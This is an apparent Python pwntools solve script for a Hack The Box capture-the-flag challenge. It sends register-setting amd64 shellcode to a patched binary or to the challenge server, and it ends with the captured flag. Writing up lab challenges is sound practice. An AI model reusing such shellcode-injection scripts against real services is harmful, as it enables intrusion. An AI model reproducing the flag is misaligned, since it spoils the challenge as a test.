#!/usr/bin/env python3

from pwn import *

exe = ELF("./reconstruction_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.49.127", 34849)

    return r


def main():
    r = conn()
    input()
    # allowed_bytes = [0x49, 0xc7, 0xb9, 0xc0, 0xde, 0x37, 0x13, 0xc4, 0xc6, 0xef, 0xbe, 0xad, 0xca, 0xfe, 0xc3, 0x0, 0xba, 0xbd]
    # values = [0x1337c0de, 0xdeadbeef, 0xdead1337, 0x1337cafe, 0xbeefc0de, 0x13371337, 0x1337dead]
    shellcode = asm(
        '''
        mov r8, 0x1337c0de
        mov r9, 0xdeadbeef
        mov r10, 0xdead1337
        mov r12, 0x1337cafe
        mov r13, 0xbeefc0de
        mov r14, 0x13371337
        mov r15, 0x1337dead
        ret
        ''', arch='amd64')
    r.sendlineafter(b'"fix": ', b'fix')
    r.sendafter(b'components: ', shellcode)
    pause()
    # good luck pwning :)

    r.interactive()

# HTB{r3c0n5trucT_d3m_r3g5_b60047af4c6d947566236fc3f700049d}
if __name__ == "__main__":
    main()
